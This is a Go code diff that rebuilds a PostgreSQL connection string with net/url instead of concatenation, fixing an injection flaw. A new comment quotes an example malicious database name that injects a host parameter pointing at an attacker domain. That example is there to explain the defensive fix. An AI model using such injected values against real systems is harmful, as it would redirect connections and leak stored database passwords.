@@ -16,6 +16,7 @@ import (
 	"errors"
 	"fmt"
 	"math"
+	"net"
 	"net/url"
 	"strconv"
 	"strings"
@@ -652,7 +653,16 @@ func (d *Datastore) UpdateConnectionFull(ctx context.Context, id int, params Con
 	return conn, nil
 }
 
-// BuildConnectionString creates a PostgreSQL connection string from a MonitoredConnection
+// BuildConnectionString creates a PostgreSQL connection string from a
+// MonitoredConnection.
+//
+// The URL is assembled with net/url rather than by concatenation, so
+// every component is escaped by construction. That matters most for the
+// database name, which a caller may override: interpolating it directly
+// let a name such as "mydb?host=evil.example.com&sslmode=disable" open
+// the libpq query string and redirect the connection, sending the
+// stored password to a host of the caller's choosing. url.URL escapes
+// the '?' into the path, where pgx reads it back as part of the name.
 func (d *Datastore) BuildConnectionString(conn *MonitoredConnection, password string, databaseOverride string) string {
 	// Use override database if specified, otherwise use connection's default
 	database := conn.DatabaseName
@@ -672,14 +682,12 @@ func (d *Datastore) BuildConnectionString(conn *MonitoredConnection, password st
 	// When no password is present, emit the username only (no ':' and no
 	// empty password component) so pgx can still fall back to the .pgpass
 	// file, preserving the previous behavior.
-	var userinfo string
+	var userinfo *url.Userinfo
 	if password != "" {
-		userinfo = url.UserPassword(conn.Username, password).String()
+		userinfo = url.UserPassword(conn.Username, password)
 	} else {
-		userinfo = url.User(conn.Username).String()
+		userinfo = url.User(conn.Username)
 	}
-
-	connStr := fmt.Sprintf("postgres://%s", userinfo)
 
 	// Use hostaddr if available, otherwise host
 	host := conn.Host
@@ -687,38 +695,32 @@ func (d *Datastore) BuildConnectionString(conn *MonitoredConnection, password st
 		host = conn.HostAddr.String
 	}
 
-	connStr += fmt.Sprintf("@%s:%d/%s", host, conn.Port, database)
+	// net.JoinHostPort brackets an IPv6 literal, so strip any brackets
+	// the stored value already carries rather than nesting them.
+	host = strings.TrimSuffix(strings.TrimPrefix(host, "["), "]")
 
 	// Collect query parameters so per-connection SSL settings flow
 	// through to the pgx driver (e.g., verify-full with a custom CA).
-	// Use "?" for the first parameter and "&" for subsequent ones.
-	sep := "?"
-	appendParam := func(key, value string) {
-		connStr += sep + key + "=" + url.QueryEscape(value)
-		sep = "&"
+	params := url.Values{}
+	addParam := func(key string, value sql.NullString) {
+		if value.Valid && value.String != "" {
+			params.Set(key, value.String)
+		}
+	}
+	addParam("sslmode", conn.SSLMode)
+	addParam("sslrootcert", conn.SSLRootCert)
+	addParam("sslcert", conn.SSLCert)
+	addParam("sslkey", conn.SSLKey)
+
+	dsn := url.URL{
+		Scheme:   "postgres",
+		User:     userinfo,
+		Host:     net.JoinHostPort(host, strconv.Itoa(conn.Port)),
+		Path:     "/" + database,
+		RawQuery: params.Encode(),
 	}
 
-	// Add SSL mode
-	if conn.SSLMode.Valid && conn.SSLMode.String != "" {
-		appendParam("sslmode", conn.SSLMode.String)
-	}
-
-	// Add SSL root certificate path (CA bundle used to verify the server)
-	if conn.SSLRootCert.Valid && conn.SSLRootCert.String != "" {
-		appendParam("sslrootcert", conn.SSLRootCert.String)
-	}
-
-	// Add SSL client certificate path (mutual TLS)
-	if conn.SSLCert.Valid && conn.SSLCert.String != "" {
-		appendParam("sslcert", conn.SSLCert.String)
-	}
-
-	// Add SSL client key path (mutual TLS)
-	if conn.SSLKey.Valid && conn.SSLKey.String != "" {
-		appendParam("sslkey", conn.SSLKey.String)
-	}
-
-	return connStr
+	return dsn.String()
 }
 
 // ListDatabases returns a list of databases on a monitored server
